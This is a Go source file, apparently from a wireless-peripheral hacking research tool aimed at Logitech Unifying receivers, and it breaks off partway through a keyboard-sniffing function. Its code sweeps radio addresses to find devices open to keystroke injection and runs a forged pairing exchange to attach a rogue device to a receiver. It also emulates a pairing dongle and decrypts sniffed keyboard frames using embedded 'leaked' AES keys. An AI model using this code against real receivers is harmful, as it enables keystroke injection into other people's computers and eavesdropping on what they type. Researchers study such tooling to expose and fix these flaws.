package main

import (
	"bufio"
	"context"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"github.com/mame82/mjackit/helper"
	"github.com/mame82/mjackit/unifying"
	"log"
	rand2 "math/rand"
	"os"
	"os/signal"
	"strings"
	"time"
)

var (
	debug = flag.Int("debug", 0, "libusb debug level (0..3)")
)

var (
	AddrDongleUnifying = unifying.Nrf24Addr{0x77, 0x82, 0x9a, 0x07, 0x00} //dongle unifying
	AddrDeviceMouse    = unifying.Nrf24Addr{0x77, 0x82, 0x9a, 0x07, 0x0b} //mouse
	AddrDeviceKeyboard = unifying.Nrf24Addr{0x77, 0x82, 0x9a, 0x07, 0x09} //keyboard

	AddrDonglePresenter = unifying.Nrf24Addr{0x19, 0x4f, 0x95, 0x1e, 0x00} //dongle presenter
	AddrDevicePresenter = unifying.Nrf24Addr{0x19, 0x4f, 0x95, 0x1e, 0x07} //presenter

	// Assumption that device idx range is 0x07..0x0e was wrong, device could have any index except 0x00, but max 6 devices
	//LogitechDevIDs = []byte{0x00, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c}
	LogitechDevIDs = func() []byte {
		res := make([]byte, 255)
		for idx, _ := range res {
			res[idx] = byte(idx + 1)
		}
		return res
	}()
)

func DiscoverLogitechDevicesForAddress(nrf24 *unifying.NRF24, AddressFound unifying.Nrf24Addr, repeatCount int) (spottedDevices map[string]*Device) {
	spottedDevices = make(map[string]*Device)

	// PingSweep for each possible Logitech device/dongle address
	// Note: The PingSweep uses a timeout of 100ms and one retry per channel, if the Logitech receiver doesn't communicate
	//  with any of its paired devices (all suspended or out of range), it hops channels frequently. As the PingSweep
	//  tests all channels iteratively, chances are high that the receiver hops to an already pinged channel and ultimately
	//  is missed. So repeating the PingSweep raises chances of capturing a valid address.
	for i := 0; i < repeatCount; i++ {
		for _, devID := range LogitechDevIDs {
			AddressFound[4] = devID
			ch, err := nrf24.PingSweep(AddressFound, 10, 0)
			if err == nil {
				devStr := AddressFound.String()
				fmt.Printf("Address %s found on channel %d\n", devStr, ch)
				if spottedDev, exists := spottedDevices[devStr]; exists {
					spottedDev.timesSpotted += 1
				} else {
					spottedDev := Device{
						addr:         unifying.Nrf24Addr{0x00, 0x00, 0x00, 0x00, 0x00},
						timesSpotted: 1,
					}
					copy(spottedDev.addr, AddressFound)
					spottedDevices[devStr] = &spottedDev
				}
			}
			/*
			else {
				fmt.Printf("Address %s not found\n", AddressFound)
			}
			*/
		}
	}
	return
}

func InjectableLogitechDevice(spottedDevices map[string]*Device) (SeemsInjectable bool, InjectionCandidates []*Device, Dongle *Device) {
	// Confirm that spotted Devices belong to a reachable Unifying dongle, criteria:
	// - DeviceAddress with last octet 0x00 (Dongle address) has to be present
	// - at least, on device with last octet between 0x07..0x0c has to be present (candidates for keystroke injection)
	InjectionCandidates = make([]*Device, 0)

	for _, dev := range spottedDevices {
		if dev.addr[4] == 0x00 {
			Dongle = dev
		} else {
			InjectionCandidates = append(InjectionCandidates, dev)
		}
	}
	if Dongle != nil && len(InjectionCandidates) > 0 {
		SeemsInjectable = true
	} else {
		SeemsInjectable = false
	}

	return
}


type Device struct {
	addr         unifying.Nrf24Addr
	timesSpotted int
	IsInjectable bool
}

func (d *Device) AddrStr() (string) {
	return d.addr.String()
}

func (d *Device) FindCurrentChannel(nrf24 *unifying.NRF24) (channel byte, err error) {
	maxRuns := 5
	for i := 0; i < maxRuns; i++ {
		channel, err = nrf24.PingSweep(d.addr, 10, 0)
		if err == nil {
			return //channel found
		}
	}
	return 0, errors.New("device not found")
}

func SimulatePairingDevice(nrf24 *unifying.NRF24, deviceName string, deviceType unifying.LogitechDeviceType, caps unifying.LogitechDeviceCapabilities, serial []byte, nonce []byte, devRepTypes unifying.LogitechDeviceReportTypes) (assignedAdress unifying.Nrf24Addr) {
	return SimulatePairingDeviceForced(nrf24, unifying.LogitechPairingAddr, deviceName, deviceType, caps, serial, nonce, devRepTypes)
}

func SimulatePairingDeviceForced(nrf24 *unifying.NRF24, pairingAddress unifying.Nrf24Addr, deviceName string, deviceType unifying.LogitechDeviceType, caps unifying.LogitechDeviceCapabilities, serial []byte, nonce []byte, devRepTypes unifying.LogitechDeviceReportTypes) (assignedAdress unifying.Nrf24Addr) {
	//Update 1:
	// The value assumed to be some kind of nonce (pairing phase 2) is more kind of a device serial, changing it allows
	// to pair additional devices, otherwise the already paired device would be overwritten.
	//

	pairingSeq1 := byte(0xAA)
	pairingSeq2 := byte(0xBB)
	pairingSeq3 := byte(0xCC)
	pairingDeviceOldAddr := unifying.Nrf24Addr{0x01, 0x02, 0x03, 0x04, 0x05}
	pairingDeviceNewAddr := unifying.Nrf24Addr{0x00, 0x00, 0x00, 0x00, 0x00}

	//reduce device name to 14 ASCII chars, note: the length field could be larger and checksum will be part of name ?? exploitable ??
	pairingDeviceName := deviceName
	if len(pairingDeviceName) > 14 {
		pairingDeviceName = pairingDeviceName[:14]
	}

	pairingDeviceNonce := []byte{0x00, 0x00, 0x00, 0x00}
	pairingDeviceSerial := []byte{0xAA, 0xAA, 0xAA, 0xAA} //Last 4 bytes aren't a nonce, but identify unique devices of same type
	copy(pairingDeviceSerial, serial)
	copy(pairingDeviceNonce, nonce)
	// Note on nonce:
	// The 4byte nonce is tx'ed in pairing request phase 2, beginning at byte no. 7
	// Newer devices seem to send an 8 byte nonce starting from byte no. 3
	// So if only a 4 byte nonce should be used, this parameter has to be crafted, like:
	//	 pairingDeviceNonce := []byte{0x00, 0x00, 0x00, 0x00, 0xAA, 0xBB, 0xCC, 0xDD}
	// Normaly only the last 4 bytes represent the nonce, as the response only has a 4 byte nonce, too.
	pairingDongleNonce := []byte{0x00, 0x00, 0x00, 0x00}



	//pairingDeviceOldAddr := Nrf24Addr{0xac, 0xb4, 0x9c, 0x7f, 0xcd}
	pairingDeviceWPID := []byte{0x20, 0x11} //Doesn't have to be valid
	pairingDongleWPID := []byte{0x00, 0x00}

	pairingDeviceUnknown1 := byte(0x14)
	pairingDeviceUnknown2 := byte(0x02)

	//pairingDeviceType := byte(LOGITECH_DEVICE_KEYBOARD) // The Logitech Unifying software shows device type derived from WPID
	pairingDeviceType := byte(deviceType) // The Logitech Unifying software shows device type derived from WPID

	//pairingDeviceCaps := []byte{LOGITECH_DEVICE_CAPS_UNIFYING_COMPATIBLE | LOGITECH_DEVICE_CAPS_LINK_ENCRYPTION, 0x00} //First byte holds caps
	//pairingDeviceCaps := []byte{LOGITECH_DEVICE_CAPS_UNIFYING_COMPATIBLE, 0x00} //First byte holds caps
	pairingDeviceCaps := []byte{byte(caps), 0x00} //First byte holds caps; keyboard 0d 1a; presenter 0c 00; mx 06 00; mx2 07 00

	t := Device{
		//		addr: LogitechPairingAddr,
		addr: pairingAddress,
	}

	nrf24.SetChannel(14)
	nrf24.EnterSnifferMode(t.addr, true)

	//0xAA = Pairing seq ID, 0xBB bytes of current (old) device address, 0x08 keep alive interval ?, 0xCC device WPID, 0x04 proto, 0x02 unknown, 0xDD device type, 0xEE device caps ??
	pairingPhase1ReqTemplate := []byte{0xAA, unifying.PAIRING_REQ, unifying.PAIRING_PHASE1, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0x08, 0xCC, 0xCC, 0x04, 0x02, 0xDD, 0xEE, 0xEE, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa5}

	pairReq1 := pairingPhase1ReqTemplate
	pairReq1[0] = pairingSeq1
	copy(pairReq1[3:], pairingDeviceOldAddr) //3..7
	pairReq1[8] = pairingDeviceUnknown1
	copy(pairReq1[9:], pairingDeviceWPID) //9,10
	//11 proto (usually 0x04, non Unifying mouse had 0x0a)
	pairReq1[12] = pairingDeviceUnknown2 //0x02 on presenter, MX 2s; 0x00 on keyboard and MX
	pairReq1[13] = pairingDeviceType
	copy(pairReq1[14:], pairingDeviceCaps) //keyboard 0d 1a; presenter 0c 00; mx 06 00; mx2 07 00
	unifying.LogitechChecksum(pairReq1)

	fmt.Printf("Search dongle in pairing mode on %s\n", t.AddrStr())
	for {
		c, e := t.FindCurrentChannel(nrf24)
		if e == nil {
			fmt.Println("\nSpotted dongle in pairing mode on channel", c)
			break
		} else {
			fmt.Printf(".")
		}

	}

	//Enable auto ack (allows TransmitPayload() to collect ack payload)
	// Needs modified nrf research firmware for CrazyRadioPA with following patch state:
	// https://github.com/mame82/nrf-research-firmware/commit/10387817d2e460e61dad6ca523b10e5ab685a21c
	nrf24.EnterSnifferMode(t.addr, true)

	fmt.Printf("Send pairing request, till empty ack received:\n% x\n", pairReq1)
	for {
		p, err := nrf24.TransmitPayload(pairReq1, 5, 1)
		fmt.Printf(".")
		if err == nil {
			fmt.Printf("\nPairing request sent and ack received with payload (len %d): % x\n", len(p), p)
			break
		}
	}

	time.Sleep(10 * time.Millisecond)

	pairAckPull1 := []byte{pairingSeq1, 0x40, unifying.PAIRING_PHASE1, pairingDeviceOldAddr[0], 0x00}
	unifying.LogitechChecksum(pairAckPull1)

	fmt.Println("Pulling ACK payloads from dongle (till rx of pairing response followed by empty ack)")
	fmt.Printf("Ack pull used for tx: % x\n", pairAckPull1)

Phase1Pull:
	for {

		p, err := nrf24.TransmitPayload(pairAckPull1, 5, 1)
		fmt.Printf(".")
		if err == nil {
			//fmt.Printf("Pairing pull sent and ack received with payload (len %d): % x\n", len(p), p)

			if len(p) > 2 {
				//likely a pairing phase 1 response (seq, 0x1f, 0x01)
				if p[0] == pairingSeq1 && p[1] == unifying.PAIRING_RSP && p[2] == unifying.PAIRING_PHASE1 {
					fmt.Printf("\nResponse for pairing phase 1: % x\n", p)

					copy(pairingDeviceNewAddr, p[3:])
					copy(pairingDongleWPID, p[9:])

					//At this point, pairing phase 1 is nearly ended, but we have to send one more ack pull, till it is
					// replied with an empty ack
					for {
						_, failed := nrf24.TransmitPayload(pairAckPull1, 5, 1)
						if failed == nil {
							fmt.Println("Additional empty ack received, moving on to phase 2, baby !!!")
							//Note the dongle switches from global pairing address to announced device address after the ack to this pull was send
							break Phase1Pull
						}
					}
				}

			}
		}
	}

	fmt.Println("Entering phase 2")

	fmt.Printf("Dongle WPID: % x\n", pairingDongleWPID)
	fmt.Printf("Switching to announced device address %s, now!!\n", pairingDeviceNewAddr.String())

	nrf24.EnterSnifferMode(pairingDeviceNewAddr, true)

	//ToDo: check if sleep is needed
	//0xAA = Pairing seq ID, 0xBB device nonces, 0xBA device serial, 0x04 proto == unifying ?, 0xCC reportTypes, 0xCD usability info, 0xDD logitech chksm
	pairReq2 := []byte{0xAA, unifying.PAIRING_REQ, unifying.PAIRING_PHASE2, 0xBB, 0xBB, 0xBB, 0xBB, 0xBA, 0xBA, 0xBA, 0xBA, 0xCC, 0xCC, 0xCC, 0xCC, 0xCD, 0x00, 0x00, 0x00, 0x00, 0x00, 0xDD}
	pairReq2[0] = pairingSeq2
	copy(pairReq2[3:], pairingDeviceNonce)
	copy(pairReq2[7:], pairingDeviceSerial)
	pairReq2[11] = byte((devRepTypes >> 0) & 0xFF)
	pairReq2[12] = byte((devRepTypes >> 8) & 0xFF)
	pairReq2[13] = byte((devRepTypes >> 16) & 0xFF)
	pairReq2[14] = byte((devRepTypes >> 24) & 0xFF)
	pairReq2[15] = 0x01 // PS location on base
	unifying.LogitechChecksum(pairReq2)

	fmt.Printf("Send pairing request 2, till empty ack received:\n% x\n", pairReq2)
	for {
		p, err := nrf24.TransmitPayload(pairReq2, 5, 1)
		fmt.Printf(".")
		if err == nil {
			fmt.Printf("\nPairing request phase 2 sent and ack received with payload (len %d): % x\n", len(p), p)
			break
		}
	}

	time.Sleep(10 * time.Millisecond)

	pairAckPull2 := []byte{pairingSeq2, 0x40, unifying.PAIRING_PHASE2, pairingDeviceNewAddr[0], 0x00}
	unifying.LogitechChecksum(pairAckPull2)

	fmt.Println("Pulling ACK payloads from dongle (till rx of pairing response)")
	fmt.Printf("Ack pull used for tx: % x\n", pairAckPull2)

Phase2Pull:
	for {

		p, err := nrf24.TransmitPayload(pairAckPull2, 5, 1)
		fmt.Printf(".")
		if err == nil {
			//fmt.Printf("Pairing pull sent and ack received with payload (len %d): % x\n", len(p), p)

			if len(p) > 2 {
				//likely a pairing phase 2 response (seq, 0x1f, 0x01)
				if p[0] == pairingSeq2 && p[1] == unifying.PAIRING_RSP && p[2] == unifying.PAIRING_PHASE2 {
					fmt.Printf("\nResponse for pairing phase 2: % x\n", p)
					copy(pairingDongleNonce, p[3:])

					break Phase2Pull
					/*
					copy(pairingDeviceNewAddr, p[3:])
					copy(pairingDongleWPID, p[9:])

					//At this point, pairing phase 1 is nearly ended, but we have to send one more ack pull, till it is
					// replied with an empty ack
					for {
						_, failed := nrf24.TransmitPayload(pairAckPull1, 5, 1)
						if failed == nil {
							fmt.Println("Additional empty ack received, moving on to phase 2, baby !!!")
							//Note the dongle switches from global pairing address to announced device address after the ack to this pull was send
							break Phase1Pull
						}
					}
					*/
				}

			}
		}
	}

	fmt.Println("Entering phase 3")

	fmt.Printf("Dongle Nonce: % x\n", pairingDongleNonce)

	//0x01 == Number of fragments ??, 0xAA = device name string len, 0xBB = device name string (ASCII, maybe UTF8), 0xCC chksm
	pairReq3 := []byte{0xAA, unifying.PAIRING_REQ, unifying.PAIRING_PHASE3, 0x01, 0xAA, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0xCC}
	pairReq3[0] = pairingSeq3
	namelen := len([]byte(pairingDeviceName))
	pairReq3[4] = byte(namelen)
	copy(pairReq3[5:], pairingDeviceName)
	unifying.LogitechChecksum(pairReq3)

	fmt.Printf("Send pairing request 3, till empty ack received:\n% x\n", pairReq2)
	for {
		p, err := nrf24.TransmitPayload(pairReq3, 5, 1)
		fmt.Printf(".")
		if err == nil {
			fmt.Printf("\nPairing request phase 3 sent and ack received with payload (len %d): % x\n", len(p), p)
			break
		}
	}

	time.Sleep(10 * time.Millisecond)

	pairAckPull3 := []byte{pairingSeq1, 0x40, unifying.PAIRING_PHASE3, pairingDeviceNewAddr[0], 0x00}
	unifying.LogitechChecksum(pairAckPull3)

	fmt.Println("Pulling ACK payloads from dongle (till rx of pairing response)")
	fmt.Printf("Ack pull used for tx: % x\n", pairAckPull2)

Phase3Pull:
	for {

		p, err := nrf24.TransmitPayload(pairAckPull3, 5, 1)
		fmt.Printf(".")
		if err == nil {
			//fmt.Printf("Pairing pull sent and ack received with payload (len %d): % x\n", len(p), p)

			if len(p) > 2 {
				//we don't receive a typical pairing response (seqID 0x1f 0x03 ...) but a message starting with
				// seqID 0f ?? 02 03 ..
				if p[0] == pairingSeq3 && p[1] == unifying.PAIRING_RSP3 {
					fmt.Printf("\nResponse for pairing phase 3: % x\n", p)
					copy(pairingDongleNonce, p[3:])

					break Phase3Pull
					/*
					copy(pairingDeviceNewAddr, p[3:])
					copy(pairingDongleWPID, p[9:])

					//At this point, pairing phase 1 is nearly ended, but we have to send one more ack pull, till it is
					// replied with an empty ack
					for {
						_, failed := nrf24.TransmitPayload(pairAckPull1, 5, 1)
						if failed == nil {
							fmt.Println("Additional empty ack received, moving on to phase 2, baby !!!")
							//Note the dongle switches from global pairing address to announced device address after the ack to this pull was send
							break Phase1Pull
						}
					}
					*/
				}

			}
		}
	}

	//Tx final pairing req message which doesn't require a response 00 4f 06 01 00 00 00 00 00 aa
	pairReqFinal := []byte{pairingSeq3, 0x4f, 0x06, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff}
	unifying.LogitechChecksum(pairReqFinal)

	fmt.Printf("Send final pairing request 3, till empty ack received:\n% x\n", pairReqFinal)
	for {
		p, err := nrf24.TransmitPayload(pairReqFinal, 5, 1)
		fmt.Printf(".")
		if err == nil {
			fmt.Printf("\nFinal pairing request sent and ack received with payload (len %d): % x\n", len(p), p)
			break
		}
	}

	//Send a keep alive (without changing channel), otherwise user has to confirm manually that the paired device is "pairing phase counter"
	// alive, by pressing key/moving mouse
	keepAliveDelay := byte(110)
	keepAlive := []byte{0x00, 0x40, 0x00, keepAliveDelay, 0x00}
	unifying.LogitechChecksum(pairReqFinal)

	fmt.Printf("Sending keep alives:\n% x\n", keepAlive)
	for {
		p, err := nrf24.TransmitPayload(keepAlive, 5, 1)
		fmt.Printf(".")
		if err == nil {
			fmt.Printf("(len %d): % x\n", len(p), p)
			//time.Sleep(time.Duration(keepAliveDelay) * time.Millisecond)
			time.Sleep(8 * time.Millisecond)

			// we return after a successfull keep alive (ack received)
			break
		}
	}

	//Note:
	// dongle starts channel hopping when the 0x4f has been received
	//
	// The header fields of the pairing communication looked like this
	//
	// out: [seq id] [0x5f == pairing request] [request stage/pairing phase counter] ... data ...
	// in: empty reply (the ack payload couldn't be in TX fifo of dongle at this point]
	//
	// out: [seq id] [0x40 == pull successive ack replies] [request stage/pairing phase counter] [1st address octet] [chksm]
	// in:  [seq id] [0x1f == pairing response] [request stage/pairing phase counter] ... data ...
	//
	// out: [seq id] [0x40 == pull successive ack replies] [request stage/pairing phase counter] [1st address octet] [chksm]
	// in:  empty ack <-- indicates that there's no further data in this phase, thus go on with next
	//
	// The final communication follows this scheme, but instead 5f the request uses 4f and has no "pairing phase counter"
	// --> out: [seq id] [0x4f == pairing request] ... data ...
	// and this happens, if we received an inbound ack response, which uses 0x0f instead of 0x1f and ,again, no "pairing
	// phase counter". Which all in all looks like
	//
	// out: [seq id] [0x5f == pairing request] [request stage/pairing phase counter 0xNN] ... data ...
	// in:  empty ack (no answer read)
	// out: [seq id] [0x40 == pull successive ack replies] [request stage/pairing phase counter 0xNN] [1st address octet] [chksm]
	// in:  [seq id] [0x0f == FINAL response] ... data ... (no counter)
	// out: [seq id] [0x4f == FINAL request] ... data ... (no counter, no response expected)
	//
	// So the field in byte 1 seems to be build like this
	// - bit 0..3:	1111 for request/response first frame (which sets the seq id used in byte 0), 0000 for successive ack pulls (maybe too, for successive responses in same phase)
	// - bit 4:		If enabled: follow up packets expected (have to be pulled), if disabled: Final frame (no follow up frames)
	// - bit 5:		Unknown/reserved (must be 0 to not conflict with non-pairing notifications)
	// - bit 6:		If enabled: request, if disabled: reply
	// - bit 7:		Unknown/reserved (must be 0 to not conflict with non-pairing notifications)
	//
	// byte 2 carries the current communication phase (0x01, 0x02, 0x03 ...)

	return pairingDeviceNewAddr
}

func SimulatePairingDongle(nrf24 *unifying.NRF24, ch byte) {

	newDeviceAddress := unifying.Nrf24Addr{0xde, 0xad, 0xbe, 0xef, 0x07}
	//newDeviceAddress := Nrf24Addr{0x41, 0x6e, 0x9e, 0xea, 0x1f}
	//newDeviceAddress := Nrf24Addr{0xaa, 0xbb, 0xcc, 0xdd, 0xe2}

	pairingOldAddr := unifying.Nrf24Addr{0x00, 0x00, 0x00, 0x00, 0x00}
	pairingDeviceWPID := []byte{0x00, 0x00}
	pairingDeviceCaps := []byte{0x00, 0x00}
	pairingDeviceNonce := []byte{0x00, 0x00, 0x00, 0x00}
	pairingDeviceUnknown1 := []byte{0x00, 0x00, 0x00, 0x00}
	globalPairingAddr := unifying.LogitechPairingAddr

	emptyPay := []byte{}

	pairingSeqID := byte(0xAA)
	pairingPhase := unifying.PAIRING_PHASE0
	pairingDeviceType := byte(0x02)
	pairingDeviceName := ""

	pairingDongleNonce := []byte{0xAA, 0xAA, 0xAA, 0xAA}

	//0xAA = Pairing seq ID, 0xBB bytes of current (old) device address, 0x08 keep alive interval ?, 0xCC device WPID, 0xDD device type, 0xEE device caps ??
	//pairingPhase1ReqTemplate := []byte{0xAA, PAIRING_REQ, PAIRING_PHASE1, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0x08, 0xCC, 0xCC, 0x04, 0x00, 0xDD, 0xEE, 0xEE, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa5}
	//0xAA = Pairing seq ID, 0xBB bytes of new device address, 0x08 keep alive interval ?,  0xDD device type, 0xEE device caps ??
	pairingPhase1ResponseTemplate := []byte{pairingSeqID, unifying.PAIRING_RSP, unifying.PAIRING_PHASE1, 0xBB, 0xBB, 0xBB, 0xBB, 0xBB, 0x08, unifying.WPID_DONGLE_MSB, unifying.WPID_DONGLE_LSB, 0x04, 0x00, 0xDD, 0xEE, 0xEE, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa5}

	//0xAA = Pairing seq ID, 0xBB dongle nonce, 0xCC received device nonce incremented by 1,  0xDD unknown1 from pairing request2
	pairingPhase2ResponseTemplate := []byte{pairingSeqID, unifying.PAIRING_RSP, unifying.PAIRING_PHASE2, 0xBB, 0xBB, 0xBB, 0xBB, 0xCC, 0xCC, 0xCC, 0xCC, 0x04, 0xDD, 0xDD, 0xDD, 0xDD, 0x00, 0x00, 0x00, 0x00, 0x00, 0xa5}

	ackPay := emptyPay

	currentAddress := globalPairingAddr

	nrf24.EnterSnifferMode(currentAddress, false)
	nrf24.SetChannel(ch)
	for {

		for {
			// prepare correct ACK payload, depending on pairing phase
			switch pairingPhase {
			case unifying.PAIRING_PHASE0:
				ackPay = emptyPay
			case unifying.PAIRING_PHASE_TRANSITION1:
				ackPay = pairingPhase1ResponseTemplate
				ackPay[0] = pairingSeqID
				copy(ackPay[3:], newDeviceAddress)
				ackPay[13] = pairingDeviceType
				copy(ackPay[14:], pairingDeviceCaps)
				unifying.LogitechChecksum(ackPay) //recalculate checksum
			case unifying.PAIRING_PHASE1:
				ackPay = emptyPay
			case unifying.PAIRING_PHASE_TRANSITION2:
				// change to new address
				currentAddress = newDeviceAddress
				nrf24.EnterSnifferMode(currentAddress, false)
				fmt.Println("Switched over to new device address", currentAddress)
			case unifying.PAIRING_PHASE2:
				ackPay = pairingPhase2ResponseTemplate
				ackPay[0] = pairingSeqID //should be 0x00
				copy(ackPay[3:], pairingDongleNonce)
				// increment device nonce by 1
				nonce := binary.BigEndian.Uint32(pairingDeviceNonce)
				nonce++
				binary.BigEndian.PutUint32(pairingDeviceNonce, nonce)
				copy(ackPay[7:], pairingDeviceNonce) //should be incremented by 1 ???
				//ackPay[10] = ackPay[10] + 1 //naive, has to be done with uint32 conversion to account for overflow
				copy(ackPay[12:], pairingDeviceUnknown1)
				unifying.LogitechChecksum(ackPay)
			case unifying.PAIRING_PHASE_TRANSITION3:
				ackPay = emptyPay
			case unifying.PAIRING_PHASE3:
				ackPay = []byte{0x00, 0x0f, 0x06, 0x02, 0x03, 0x4b, 0x49, 0xcd, 0x6b, 0x1a}
				copy(ackPay[5:], pairingDongleNonce[2:4])
				copy(ackPay[7:], pairingDeviceNonce[0:2])
				unifying.LogitechChecksum(ackPay)
			case unifying.PAIRING_FINISHED:
				//ackPay = emptyPay
			}

			// Transmit the current ack payload in response to whatever frame arrives
			txerr := nrf24.TransmitAckPayload(ackPay)
			if txerr == nil {
				fmt.Println("------------------------------------------")
				fmt.Printf("%s >: % #x\n", currentAddress, ackPay)
			}

			// read all received data (
			indata := true
			for indata { //If data has arrived, loop till RX fifo empty, as it get's flushed with next call to transmit ack payload
				p, rxerr := nrf24.ReceivePayload() //try to read an ACK payload (or other traffic for the address, which we aren't interested in)
				if rxerr == nil && p[0] == 0x00 {
					if len(p) > 3 {

						pay := p[1:] //Remove first byte, as it indicates success/error of read call
						fmt.Printf("%s <: % #x\n", currentAddress, pay)

						if pay[1] == unifying.PAIRING_REQ && pay[2] == unifying.PAIRING_PHASE1 { //Pairing request phase 1
							pairingSeqID = pay[0]
							copy(pairingOldAddr, pay[3:])

							copy(pairingDeviceWPID, pay[9:])
							pairingDeviceType = pay[13]
							copy(pairingDeviceCaps, pay[14:])

							pairingPhase = unifying.PAIRING_PHASE_TRANSITION1
							fmt.Printf("Received pairing request (old address %s, WPID %#x deviceType %#x), replied with empty ack\n", pairingOldAddr.String(), pairingDeviceWPID, pairingDeviceType)
						}

						if pay[1] == unifying.PAIRING_REQ && pay[2] == unifying.PAIRING_PHASE2 { //Pairing request phase 2
							pairingSeqID = pay[0]
							copy(pairingDeviceNonce, pay[7:])
							copy(pairingDeviceUnknown1, pay[12:])

							pairingPhase = unifying.PAIRING_PHASE2
							fmt.Printf("Received pairing request 2 (device nonce % #x unknown1 % #x)\n", pairingDeviceNonce, pairingDeviceUnknown1)
						}

						if pay[1] == unifying.PAIRING_REQ && pay[2] == unifying.PAIRING_PHASE3 { //Pairing request phase 3
							devNameLen := pay[4]
							devNameBytes := make([]byte, devNameLen)
							copy(devNameBytes, pay[5:])
							pairingDeviceName = string(devNameBytes)

							pairingPhase = unifying.PAIRING_PHASE3
							fmt.Printf("Received pairing request 3 (device name '%s')\n", pairingDeviceName)
						}

						if pay[1] == 0x40 && pay[2] == unifying.PAIRING_PHASE1 {
							if pairingPhase == unifying.PAIRING_PHASE_TRANSITION1 {
								fmt.Printf("Received first pairing phase 1 ack pull, replied with pairing phase 1 response (new address: %s)\n", newDeviceAddress)
								pairingPhase = unifying.PAIRING_PHASE1
							} else if pairingPhase == unifying.PAIRING_PHASE1 {
								fmt.Printf("Received second pairing phase 1 ack pull, replied with empty ACK. moving on to phase 2\n")
								pairingPhase = unifying.PAIRING_PHASE_TRANSITION2
							} else {
								fmt.Printf("Received pairing phase 1 ack pull after phase 1:  % #x\n", pay)
							}
						}

						if pay[1] == 0x40 && pay[2] == unifying.PAIRING_PHASE2 {
							if pairingPhase == unifying.PAIRING_PHASE2 {
								fmt.Printf("Received pairing phase 2 ack pull, replied with pairing phase2 response (dongle nonce: % #x, device nonce++: % #x)\n", pairingDongleNonce, pairingDeviceNonce)
								pairingPhase = unifying.PAIRING_PHASE_TRANSITION3
							} else {
								fmt.Printf("Received pairing phase 2 ack pull, again ... that's wrongs:  % #x\n", pay)
							}
						}

						if pay[1] == 0x4f /* && pay[2] == 0x06 */ {
							fmt.Printf("Pairing finished: % #x\n", pay)
							pairingPhase = unifying.PAIRING_FINISHED
							return
						}
					} else {
						fmt.Println("Short or empty packet received")
					}
				} else {
					indata = false
				}

			}
		}

	}
}

func AESBrute() {
	data := []byte{0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0xa, 0xb, 0xc, 0xd, 0xe, 0xf}
	key := make([]byte, 16)
	count := 0xffffffff

	now := time.Now()
	for i := 0; i < count; i++ {
		if i%100000 == 0 {

			fmt.Printf("100000 rounds aes128 after %v, tested: %08x\n", time.Since(now), i)
		}

		rand.Read(key)

		unifying.EncryptAes128Ecb(data, key)
	}
}

func DecryptFrame(key []byte, indata []byte, frame []byte) (result []byte, err error) {
	// check if encrypted keyboard frame
	// template 0x00 0xd3 0x26 0x97 0xb7 0x43 0xdc 0x93 0xe5 0x4f 0xdf 0x38 0xf2 0xfb 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0xcf
	//          0    1    2    3    4    5    6    7    8    9    10   11   12   13   14   15   16   17   18   19   20   21
	eNoCryptFrame := errors.New("no encrypted frame")
	if len(frame) != 22 {
		err = eNoCryptFrame
		return
	}

	if frame[1] != 0xd3 { //only known report ID so far
		err = eNoCryptFrame
		return
	}

	result = make([]byte, 8)

	cryptPay := make([]byte, 8)
	copy(cryptPay, frame[2:])
	counter := frame[10:14]
	aesin := make([]byte, 16)
	copy(aesin, indata)
	copy(aesin[7:], counter) //update counter

	cipher := unifying.EncryptAes128Ecb(aesin, key)[0:8]

	for idx, cipher_byte := range cipher {
		result[idx] = cipher_byte ^ cryptPay[idx]
	}

	return
}

func TestCheckKey() {
	//AES test
	//0x81e0 Leaked key for paired keyboard   02:7d:77:07:af:65:17:0d:30:88:d9:11:7f:99:20:3d
	//0x8311 Leaked plain for paired keyboard 04:14:1d:1f:27:28:0d:df:7c:2d:eb:0a:0d:13:26:0e //df:7c:2d:eb is counter and thus changing
	//cipher 21:0c:d5:af:5c:5f:e9:28:96:17:15:33:21:ec:31:08

	// 0x00 plain 0x00
	// 0x00 key 0x02

	keyDump := []byte{0x02, 0x7d, 0x77, 0x07, 0xaf, 0x65, 0x17, 0x0d, 0x30, 0x88, 0xd9, 0x11, 0x7f, 0x99, 0x20, 0x3d}
	plainDump := []byte{0x04, 0x14, 0x1d, 0x1f, 0x27, 0x28, 0x0d, 0xdf, 0x7c, 0x2d, 0xeb, 0x0a, 0x0d, 0x13, 0x26, 0x0e}

	//cipher 21:0c:d5:af:5c:5f:e9:28:96:17:15:33:21:ec:31:08
	//cipher: 210cd5af5c5fe9289617153321ec3108
	//key: 027d7707af65170d3088d9117f99203d
	//plain: 04141d1f27280ddf7c2deb0a0d13260e

	key := make([]byte, 16)
	plain := make([]byte, 16)
	//KeyReOrder(keyDump, key)
	//KeyReOrder(plainDump, plain)
	copy(key, keyDump)
	copy(plain, plainDump)
	cipher := unifying.EncryptAes128Ecb(plain, key)
	fmt.Printf("key:    % x\n", key)
	fmt.Printf("plain:  % x\n", plain)
	fmt.Printf("cipher: % x\n", cipher)
	fmt.Printf("needed: 21:20:d5:af:5c:5f:e9:e1:xx:xx:xx:xx:xx:xx:xx:xx")
	return
	//end AES test

}

func TestSniffEncryptedKeyboard() {
	nrf24, err := unifying.NewNRF24()
	defer nrf24.Close()
	if err != nil {
		panic(err)
	}

	nrf24.EnableLNA()

	//SNIFF KEYBOARD RF

	//keyDump := []byte{0x02, 0x7d, 0x77, 0x07, 0xaf, 0x65, 0x17, 0x0d, 0x30, 0x88, 0xd9, 0x11, 0x7f, 0x99, 0x20, 0x3d}
	keyDump := []byte{0x02, 0x7d, 0x77, 0x07, 0x34, 0x65, 0x99, 0xee, 0xe3, 0x88, 0x80, 0x11, 0x38, 0x4e, 0x20, 0x83}
	plainDump := []byte{0x04, 0x14, 0x1d, 0x1f, 0x27, 0x28, 0x0d, 0xdf, 0x7c, 0x2d, 0xeb, 0x0a, 0x0d, 0x13, 0x26, 0x0e}

	//New keys after re-pairing
